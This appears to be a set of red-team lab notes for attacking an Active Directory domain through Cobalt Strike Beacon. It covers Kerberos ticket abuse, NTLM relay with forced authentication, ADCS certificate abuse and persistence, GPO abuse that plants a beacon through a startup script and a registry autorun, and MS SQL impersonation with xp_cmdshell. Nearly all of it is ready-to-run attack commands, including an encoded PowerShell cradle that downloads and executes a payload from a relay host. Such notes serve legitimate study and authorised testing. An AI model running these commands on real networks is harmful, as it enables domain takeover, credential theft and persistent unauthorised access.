ubuntu@DESKTOP-3BSK7NO > proxychains psexec.py -dc-ip 10.10.122.10 -target-ip 10.10.122.30 -no-pass -k dev.cyberbotic.io/jking@web.dev.cyberbotic.io
```
```r
# 1. If you have a `kirbi` ticket, convert it to `ccache` for impacket usage
beacon> getuid
[*] You are DEV\bfarmer

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap
doIFzj[...snip...]MuSU8=

# 2. Base64-decode the ticket and save as `bfarmer.kirbi`.
ubuntu@DESKTOP-3BSK7NO > echo -en 'doIFzj[...snip...]MuSU8=' | base64 -d > bfarmer.kirbi

# 3. Convert the ticket to `ccache` with impacket-ticketConverter
ubuntu@DESKTOP-3BSK7NO > ticketConverter.py bfarmer.kirbi bfarmer.ccache

# 4. Create an environment variable `KRB5CCNAME` pointing to the new ccache
ubuntu@DESKTOP-3BSK7NO > export KRB5CCNAME=bfarmer.ccache

# 5. Use the converted TGT to interact with the SQL-2 service
ubuntu@DESKTOP-3BSK7NO > proxychains mssqlclient.py -dc-ip 10.10.122.10 -no-pass -k dev.cyberbotic.io/bfarmer@sql-2.dev.cyberbotic.io

# NOTE: Add a static host entry in `/etc/hosts` and enable `remote_dns` in `/etc/proxychains.conf` if required
ubuntu@DESKTOP-3BSK7NO > sudo nano /etc/proxychains.conf
# enable or set 'proxy_dns' or 'remote_dns'

ubuntu@DESKTOP-3BSK7NO > sudo nano /etc/hosts
# Add: 10.10.122.25 sql-2.dev.cyberbotic.io
```

## Proxifier
```r
# 1. Run Proxifier as Administrator.

# 2. Create a new proxy entry
Open Proxifier > Profile > Proxy Servers > Add

# 3. Enter the Proxy Server parameters
[Reference: see screenshot or configuration if needed]

# 4. Configure which apps must use the proxy and under which conditions
[Reference for rules in Proxifier]

# 5. For Kerberos traffic to be proxied, create domain rules in Proxifier
# By default, Proxifier does not proxy Kerberos traffic unless explicitly set with domain rules
```

### Proxifier examples
```r
# 1. Use Proxifier in Windows environments

# 2. Example with runas. (Run CMD.exe as Administrator)
PS > runas /netonly /user:dev/bfarmer mmc.exe

# 3. Example with mimikatz
PS > mimikatz # privilege::debug
PS > mimikatz # sekurlsa::pth /domain:DEV /user:bfarmer /ntlm:4ea24377a53e67e78b2bd853974420fc /run:mmc.exe

# 4. Example with PowerShell
PS C:\Users\Attacker> $cred = Get-Credential
PS C:\Users\Attacker> Get-ADComputer -Server 10.10.122.10 -Filter * -Credential $cred | select
```

### Launch HeidiSQL through Proxifier
```r
# 1. Generate a TGS for the MSSQLSvc service using bfarmer's TGT (previously obtained).
PS C:\Windows\system32> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:doIFzj[...snip...]MuSU8= /service:MSSQLSvc/sql-2.dev.cyberbotic.io:1433 /dc:dc-2.dev.cyberbotic.io /ptt

# 2. Launch HeidiSQL from the same PowerShell window.
PS C:\Windows\system32> C:\Tools\HeidiSQL\heidisql.exe

# 3. Configure the host name as `sql-2.dev.cyberbotic.io` and connect.
```

## Browser Proxy with FoxyProxy
```r
# 1. Configure the FoxyProxy extension accordingly.
# 2. Browse to the internal web server: `10.10.122.30`.
```

## Reverse Port Forwards
```r
# Example in a Lab
# DC-2 does not have direct access to the teamserver
PS C:\Users\Administrator> hostname
dc-2

PS C:\Users\Administrator> iwr -Uri http://nickelviper.com/a
iwr : Unable to connect to the remote server
```
```r
# 1. Configure a Reverse Port Forward so that traffic can be relayed if the teamserver is not directly accessible.
# When machine X connects to port 8080 on WKSTN-2 -> traffic is forwarded to port 80 on the teamserver
beacon> rportfwd 8080 127.0.0.1 80

# 2. Verify the port is listening using netstat.
beacon> run netstat -anp tcp
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING
beacon> shell hostname

# 3. Test the redirection with PowerShell.
PS > iwr -Uri http://wkstn-2:8080/a
PS > iwr -Uri http://10.10.123.102:8080/a

# 4. Create a firewall rule to allow inbound traffic on port 8080.
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080

# 5. Remove the firewall rule when no longer needed.
beacon> powershell Remove-NetFirewallRule -DisplayName "8080-In"
```

## NTLM Relay
```r
# Config for port redirection & SMB traffic for NTLMRelay

# 1. Obtain a SYSTEM beacon on the machine that will capture SMB traffic (lab uses WKSTN-2 BFARMER->SYSTEM)

# 2. Create firewall rules to allow inbound traffic on ports 8080 and 8445.
beacon> powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

# 3. Set reverse port forwarding
# When X connects on port 8080 -> forward to port 80
# When X connects on port 8445 -> forward to port 445
beacon> rportfwd 8080 127.0.0.1 80
beacon> rportfwd 8445 127.0.0.1 445

# 10.10.123.102:8080 -> 10.10.5.50:80
# 10.10.123.102:8445 -> 10.10.5.50:445

# 4. Configure Proxychains for the proxy
attacker@ubuntu > sudo nano /etc/proxychains.conf
socks5 127.0.0.1 1080 socks_user socks_password

# 5. Start a SOCKS proxy in Beacon
beacon> socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging

# 6. Use Proxychains to pass NTLMRelay traffic to the Beacon, targeting the DC, and run an SMB-encoded payload
attacker@ubuntu > sudo proxychains ntlmrelayx.py -t smb://10.10.122.10 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADMALgAxADAAMgA6ADgAMAA4ADAALwBiACIAKQA='

#Attacks -> Scripted Web Delivery (S) 
# Example: 
# IEX ((new-object net.webclient).downloadstring('http://10.10.5.50:80/b'))
# Adjust to 
# IEX (new-object net.webclient).downloadstring("http://10.10.123.102:8080/b")

# 7. Upload the PortBender driver and load its file
beacon> cd C:\Windows\system32\drivers
beacon> upload C:\Tools\PortBender\WinDivert64.sys

# Then in Cobalt Strike > Script Manager, load `PortBender.cna` from `C:\Tools\PortBender`

# 8. Run PortBender to redirect traffic from 445 to 8445
beacon> PortBender redirect 445 8445

# 9. Access the share from your system or use MSPRN or Printspooler to force authentication
C:\Users\nlamb> dir \\10.10.123.102\relayme

# 10. Check logs and use link to connect to the SMB beacon
beacon> link dc-2.dev.cyberbotic.io TSVCPIPE-89dd8075-89e1-4dc8-aeab-dde50401337

# 11. To stop PortBender, kill the job
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 2    5740  PortBender

beacon> jobkill 2
beacon> kill 5740
```

### NTLM Relay tricks
```r
# 1. Use a 1x1 image link in an email pointing to an SMB resource to force NTLM authentication
<img src="\\10.10.123.102\test.ico" height="1" width="1" />

# 2. Create a Windows Shortcut (LNK) referencing an SMB resource to force NTLM authentication
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
$shortcut.IconLocation = "\\10.10.123.102\test.ico"
$shortcut.Save()

# 3. Tools that auto-trigger NTLM authentications:
# - SpoolSample: exploits PrintSpooler vulnerability
# - SharpSystemTriggers: triggers remote authentications
# - PetitPotam: uses MS-EFSRPC to force NTLM auth
```

## Relaying WebDAV + RBCD
```r
# Relaying WebDAV + RBCD (Resource-Based Constrained Delegation)

# 1. Check WebClient service status on target endpoints
beacon> run sc qc WebClient

# 2. Use GetWebDAVStatus to check if WebClient is running
beacon> inline-execute C:\Tools\GetWebDAVStatus\GetWebDAVStatus_BOF\GetWebDAVStatus_x64.o wkstn-1,wkstn-2

# 3. Create firewall rules for port 8888
beacon> powershell New-NetFirewallRule -DisplayName "8888-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8888

# 4. Set rportfwd 8888 -> 127.0.0.1:8888
beacon> rportfwd 8888 localhost 8888

# 5. Start a SOCKS proxy in the beacon
beacon> socks 1080 socks5 disableNoAuth 3ky 3kyRoad2CRTO enableLogging

# 6. Launch NTLMRelayx pointing at the CA server or an LDAPS endpoint
attacker@ubuntu > sudo proxychains ntlmrelayx.py -t ldaps://10.10.122.10 --delegate-access -smb2support --http-port 8888

# 7. Use SharpSystemTriggers to trigger auth to your WebDAV server
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe wkstn-1 wkstn-2@8888/pwnnet

# 8. Calculate AES256 hash for newly added machine account or changes
PS> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:RWRTIKTA$ /domain:dev.cyberbotic.io

# 9. Perform S4U2Proxy to request TGS from the system
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:RWRTIKTA$ /ticket:doIFfj<SNIPPED>y5pbw== /nowrap

# 10. Involve the TGS in a new session
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGfj<SNIPPED>y5pbw==

# 11. Access the resource
beacon> steal_token 1872
beacon> ls \\dc-2.dev.cyberbotic.io\c$

# 12. Clean up the newly created or modified computer account if necessary.
```

## Relaying WebDAV + Shadow Credentials
```r
# Relaying WebDAV + Shadow Credentials

# 1. Check the WebClient service status
C:\Users\bfarmer>sc qc WebClient

# 2. Use GetWebDAVStatus
beacon> inline-execute C:\Tools\GetWebDAVStatus\GetWebDAVStatus_BOF\GetWebDAVStatus_x64.o wkstn-1,wkstn-2

# 3. Create firewall rules for port 8888
beacon> powershell New-NetFirewallRule -DisplayName "8888-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8888

# 4. Set rportfwd 8888 -> localhost:8888
beacon> rportfwd 8888 localhost 8888

# 5. Generate a certificate file with NTLMRelayx using `--shadow-credentials`
attacker@ubuntu > sudo proxychains ntlmrelayx.py -t ldaps://10.10.122.10 --shadow-credentials -smb2support --http-port 8888

# 6. Use SharpSystemTriggers for WebDAV-based forced auth
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe wkstn-1 wkstn-2@8888/pwnnet

# 7. Convert the certificate to ccache or Base64 for usage with Rubeus
attacker@ubuntu > cat P8twTOyE.pfx | base64 -w 0

# 8. Request a TGT using Rubeus with the certificate
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-1$ /certificate:MIIM7w[...]ECAggA /password:7faf0673-f9b2-4aef-8bd4-c3c4df53ea12 /nowrap

# 9. Use S4U to get the TGS for the target system
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/wkstn-1.dev.cyberbotic.io /user:WKSTN-1$ /ticket:doIFLD[...]4tDLklP /nowrap

# 10. In a new netonly session, inject the TGS
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]MuaW8=

# 11. Access resources
beacon> steal_token 19524
beacon> ls \\wkstn-1.dev.cyberbotic.io\c$
[*] Listing: \\wkstn-1.dev.cyberbotic.io\c$\
```

---

# Active Directory Certificate Services

## Finding Certificate Authorities
```r
# Enumerate the Certificate Authorities (CA) in the environment.
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas
```

## Misconfigured Certificate Templates
```r
# Search for improperly configured certificate templates that could be exploited.
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable+
```

## Vulnerable User Template - Case: _ENROLLEE_SUPPLIES_SUBJECT_
```r
[Reference: custom user template with ENROLLEE_SUPPLIES_SUBJECT enabled, etc.]

# 1. This config allows any Domain User to request a certificate for any other Domain User (including a Domain Admin).
beacon> getuid
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb

# 2. Copy the entire certificate output (including the private key) as `cert.pem`.

# 3. Convert `cert.pem` to `cert.pfx` with OpenSSL.
ubuntu@DESKTOP-3BSK7NO > openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
# (Set a password, e.g., 3kyRoad2CRTO)

# 4. Base64-encode the `.pfx` for usage with Rubeus.
ubuntu@DESKTOP-3BSK7NO > cat cert.pfx | base64 -w 0

# 5. Request a TGT for the target user using the certificate.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /password:3kyRoad2CRTO /nowrap

# 6. Inject the TGS into a new netonly token.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

# 7. Access the service with the injected ticket.
beacon> steal_token 1234
beacon> ls \\web.dev.cyberbotic.io\c$
```

## NTLMRelay to ADCS HTTP Endpoints
```r
# Relay NTLM to ADCS HTTP endpoints
# e.g., http[s]://<hostname>/certsrv
# Then request a certificate on behalf of a DC or other high-privileged account.

# 1. Enable a SOCKS Proxy in the Beacon for OPSEC.
beacon> socks 1080 socks5 disableNoAuth 3ky 3kyRoad2CRTO enableLogging

# 2. Check it on the team server.
attacker@ubuntu > sudo ss -lpnt

# 3. Configure proxychains in Linux to route traffic to that proxy.
attacker@ubuntu > sudo nano /etc/proxychains.conf
socks5 127.0.0.1 1080 3ky 3kyRoad2CRTO

# 5. Create a firewall rule for port 8445 if needed.
beacon> powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445

# 6. Reverse port forward from port 8445 to 445.
beacon> rportfwd 8445 127.0.0.1 445

# 7. Upload the WinDivert driver for PortBender (if needed).
beacon> cd C:\Windows\system32\drivers
beacon> upload C:\Tools\PortBender\WinDivert64.sys

# 8. Configure PortBender to redirect 445 to 8445
beacon> PortBender redirect 445 8445

# 9. Run ntlmrelayx pointing to the certsrv endpoint
attacker@ubuntu > sudo proxychains ntlmrelayx.py -t https://10.10.122.10/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# 10. Trigger PrintSpooler to get DC (or other system) to authenticate to your relay
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.122.30 10.10.123.102

# 11. Use the certificate from the relay in Base64 for a TGT request
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WEB$ /certificate:MIIM7w[...]ECAggA /nowrap

# 12. S4U to get a service ticket
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/web.dev.cyberbotic.io /user:WEB$ /ticket:doIFuj[...]lDLklP /nowrap

# 13. Inject the service ticket in a netonly session
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

# 14. Interact with the resource
beacon> steal_token 1234
beacon> ls \\web.dev.cyberbotic.io\c$
```

## User Persistence
```r
beacon> getuid
[*] You are DEV\nlamb

beacon> run hostname
wkstn-1

# 1. Enumerate user certificates from Personal Certificate store.
# Must run in that user’s session.
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates

# 2. Export the certificate in DER and PFX to disk.
beacon> mimikatz !crypto::certificates /export

# 3. Convert the .pfx to Base64 for Rubeus usage.
ubuntu@DESKTOP-3BSK7NO > cat /mnt/c/Users/Attacker/Desktop/CURRENT_USER_My_0_Nina\ Lamb.pfx | base64 -w 0

# 4. Use the exported certificate to request a TGT for the user.
# Use `/enctype:aes256` for better OPSEC
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIINeg[...]IH0A== /password:mimikatz /enctype:aes256 /nowrap

# 5. Launch a netonly token with the TGS
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

# 6. Steal the token and interact with a resource
beacon> steal_token 1234
beacon> ls \\sql-2.dev.cyberbotic.io\c$

# 7. If the certificate is not present, request it from their active session and follow the same steps above
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:User
```

## Computer Persistence
```r
# 1. Export the machine certificate from the local machine certificate store.
# Requires an elevated session (SYSTEM or Administrator).
beacon> mimikatz !crypto::certificates /systemstore:local_machine /export

# 2. Convert the .pfx to Base64 for Rubeus usage.
ubuntu@DESKTOP-3BSK7NO > cat /mnt/c/Users/Attacker/Desktop/local_machine_My_0_wkstn-1.dev.cyberbotic.io.pfx | base64 -w 0

# 3. Encode the exported certificate and request a TGT for the machine account.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:MIINCA[...]IH0A== /password:mimikatz /nowrap

# 4. Inject the TGT into a sacrificial session
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:WKSTN-1$ /password:FakePass /ticket:doIGY<SNIPPED>5pbw==

# 5. Steal the token and interact with the remote resource
beacon> steal_token 1234

# 6. If the machine certificate is not stored, request one with Certify.
# The `/machine` flag automatically elevates privileges to SYSTEM for the request
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:Machine /machine
```

---

# Group Policy

## Modify Existing GPO
```r
# 1. Import PowerView.ps1
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1  

# 2. Enumerate domain GPOs and check if the current user can modify them
beacon> powerpick Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericWrite" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

# 3. Convert the SID to a name to identify which group has GPO modification rights
beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

# 4. Use `Get-DomainGPO` to get the GPO’s `displayName` and `gpcFileSysPath`.
beacon> powerpick Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath
# e.g., Vulnerable GPO \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5059FAC1-5E94-4361-95D3-3BB235A23928}

# 5. Identify which OU the GPO is linked to
beacon> powerpick Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" | select distinguishedName

# 6. Identify computers in that OU
beacon> powerpick Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName

# 7. Modify the files in SYSVOL (the gpcFileSysPath) to update the GPO if you do not have GPMC
beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5059FAC1-5E94-4361-95D3-3BB235A23928}
```

### SharpGPOAbuse - `Computer Startup Script` Attack
```r
# 1. Find a writable share to upload the payload
beacon> powerpick Find-DomainShare -CheckShareAccess

# 2. Upload the payload to DC-2 share
beacon> cd \\dc-2\software
beacon> upload C:\Payloads\dns_x64.exe
beacon> ls

# 3. Example with a `Computer Startup Script`. Places a startup script in SYSVOL that runs each time a targeted machine boots.
beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\dc-2\software\dns_x64.exe" --GPOName "Vulnerable GPO"

# 4. Log into the console of WKSTN-1 and run `gpupdate /force`. Then reboot to get a `DNS Beacon` as SYSTEM.
beacon> run gpupdate /force
beacon> checkin
```

### SharpGPOAbuse - `Computer Task Script` Attack
```r
# 1. Set up a pivot listener (port 1234) in Beacon, plus a download cradle on port 80
# WKSTN-2 Beacon -> Pivoting -> etc.

# 2. Open the relevant ports. For example, 8080 for the script web server.
beacon> powerpick New-NetFirewallRule -DisplayName "Rule 1" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444
beacon> powerpick New-NetFirewallRule -DisplayName "Rule 2" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080

# 3. A reverse port forward from 8080 to 80 if necessary
beacon> rportfwd 8080 127.0.0.1 80

# 4. Use SharpGPOAbuse to add a scheduled task to the GPO
beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "C:\Windows\System32\cmd.exe" --Arguments "/c powershell -w hidden -enc base64" --GPOName "Vulnerable GPO"

# 5. Force GPO update
beacon> run gpupdate /force
```

## Create & Link a GPO
```r
# Create and link a new malicious GPO

# 1. Check if you have permissions to create a new GPO in the domain
beacon> powerpick Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }

# 2. Identify OUs you can link a GPO to (Write gPlink)
beacon> powerpick Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl

# Convert the SID
beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

# 3. Check if the RSAT module for GPO is installed
beacon> powerpick Get-Module -List -Name GroupPolicy | select -expand ExportedCommands

# 4. Create a new malicious GPO
beacon> powerpick New-GPO -Name "Evil GPO"

# 5. Find a share to upload the payload
beacon> powerpick Find-DomainShare -CheckShareAccess

# 6. Upload the payload to DC-2
beacon> cd \\dc-2\software
beacon> upload C:\Payloads\dns_x64.exe

# 7. Configure the GPO to add a registry autorun that launches a malicious binary
beacon> powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\dns_x64.exe" -Type ExpandString

# 8. Link the newly created GPO to the target OU
beacon> powershell Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"

# NOTE: HKLM autoruns require a system restart to be executed
```

---

# MS SQL Servers

## MS SQL Enumeration

### PowerUpSQL
```r
# 1. Import the PowerUpSQL module to begin enumeration
beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1

# 2.1 Enumerate SQL instances in the domain via SPNs starting with MSSQL*
beacon> powershell Get-SQLInstanceDomain

# 2.2 Enumerate SQL instances on the network via broadcast
beacon> powershell Get-SQLInstanceBroadcast

# 2.3 Scan the network for open SQL instances using UDP
beacon> powershell Get-SQLInstanceScanUDP

# 3. Test connectivity to a particular SQL instance
beacon> powershell Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl

# 4. Gather detailed info for an accessible SQL instance
beacon> powershell Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"

# Automate enumeration across multiple accessible SQL servers
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo

# Issue SQL queries if you have valid permissions
beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select @@servername"
```

### SQLRecon
```r
# 1. Enumerate MS SQL servers via SPNs
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /enum:sqlspns

# 2. Obtain info about the instance with the `info` module
# The `/auth:wintoken` param lets SQLRecon use Beacon’s access token
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io /module:info

# 3. Determine what roles/permissions the current user has on the SQL instance
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:whoami

# 4. Find a user or group that has access to SQL instances
beacon> powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }

# 5.1 Target the MS SQL service account, which often has sysadmin privileges
beacon> make_token DEV\mssql_svc Cyberb0tic
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:whoami

# 5.2 Use `/auth:windomain` with domain credentials
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:windomain /domain:dev.cyberbotic.io /u:mssql_svc /p:Cyberb0tic /host:sql-2.dev.cyberbotic.io,1433 /module:whoami

# 6. Run SQL queries with the `query` module
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:query /c:"select @@servername"
```

### Impacket-mssqlclient + proxychains
```r
## Impacket-mssqlclient + Proxychains

# 1. Enable SOCKS proxy in Beacon (SOCKS5 for better OPSEC)
beacon> socks 1080 socks5 disableNoAuth 3ky 3kyRoad2CRTO enableLogging

# 2. Check it on the team server
attacker@ubuntu > sudo ss -lpnt

# 3. Configure Proxychains in WSL to route traffic to the SOCKS proxy
ubuntu@DESKTOP-3BSK7NO > sudo nano /etc/proxychains.conf
socks5 10.10.5.50 1080 3ky 3kyRoad2CRTO

# 4. Connect to the MS SQL instance
ubuntu@DESKTOP-3BSK7NO > proxychains mssqlclient.py -windows-auth DEV/bfarmer@10.10.122.25
SQL> select @@servername;
```

## MS SQL Impersonation

### Manual Way to Impersonate
```r
# 1. Find which accounts can be impersonated
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';

# 2. Query the principal IDs
SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;

# 3. Map the grantee_principal_id and grantor_principal_id for impersonation relationships
SELECT p.permission_name, g.name AS grantee_name, r.name AS grantor_name 
FROM sys.server_permissions p 
JOIN sys.server_principals g ON p.grantee_principal_id = g.principal_id 
JOIN sys.server_principals r ON p.grantor_principal_id = r.principal_id 
WHERE p.permission_name = 'IMPERSONATE';

# 4. Check the current SQL user
SELECT SYSTEM_USER;
# e.g. DEV\bfarmer

# 5. Check if the current user is a sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
# 0 => not sysadmin

# 6. Assume mssql_svc context
EXECUTE AS login = 'DEV\mssql_svc'; SELECT SYSTEM_USER;
# e.g. DEV\mssql_svc

# 7. Check if mssql_svc has sysadmin
EXECUTE AS login = 'DEV\mssql_svc'; SELECT IS_SRVROLEMEMBER('sysadmin');
# 1 => sysadmin
```

### SQLRecon
```r
# 1. Use SQLRecon to identify accounts that can be impersonated
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:impersonate

# 2. Run queries in the context of an impersonated account
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:iwhoami /i:DEV\mssql_svc

# 3. Check the roles for the impersonated user
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /i:DEV\mssql_svc /module:iquery /c:"SELECT IS_SRVROLEMEMBER('sysadmin');"
```

## MS SQL Command Execution

### Manual Way to Enable and Use xp_cmdshell
```r
# 1. Try xp_cmdshell
SQL> EXEC xp_cmdshell 'whoami';
# ERROR: blocked because xp_cmdshell is off

# 2. Check xp_cmdshell config
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';

# 3. Enable xp_cmdshell (requires sysadmin)
sp_configure 'show advanced options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# 4. Confirm xp_cmdshell is enabled
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';

# 5. Attempt again
SQL> EXEC xp_cmdshell 'whoami';
# e.g. DEV\MSSQL_SVC
```

### PowerUpSQL
```r
# xp_cmdshell can run OS commands if you’re sysadmin
# The PowerUpSQL cmdlet `Invoke-SQLOSCmd`

beacon> powershell Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults
```

### SQLRecon
```r
# Enable xp_cmdshell using SQLRecon plus impersonation
